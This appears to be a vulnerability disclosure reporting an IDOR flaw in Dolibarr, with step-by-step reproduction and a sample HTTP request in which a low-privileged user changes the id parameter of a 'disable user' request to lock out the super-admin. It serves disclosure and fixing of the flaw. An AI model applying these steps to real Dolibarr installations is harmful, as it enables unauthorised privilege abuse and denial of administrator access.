# Description 

Dolibarr is vulnerable to an IDOR vulnerability which can lead to Privilege Escalation. 

# Proof of Concept

1.Download and Install Dolibarr from [Dolibarr](https://github.com/Dolibarr/dolibarr/) 

2.Create two New users with the following permissions(let the new user be SAM and John)      
   -Delete or disable other users    
   -Read other users and groups  
  
3.Now Login as the new user(SAM).Sam just have the permission to Disable other users other than admins.The Disable button is not avilable for admin profiles.

4.Now visit Johns profile by Clicking List of user,You will find a disable button to disable John's profile. Click on it and intercept the request . A request similar to the 
snippet will be made

```
GET /user/card.php?action=disable&id=4 HTTP/1.1
Host: localhost/
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
```
5:Replace the ``&id=`` parameter with the ID of Admin.

The Super-admin gets disabled.
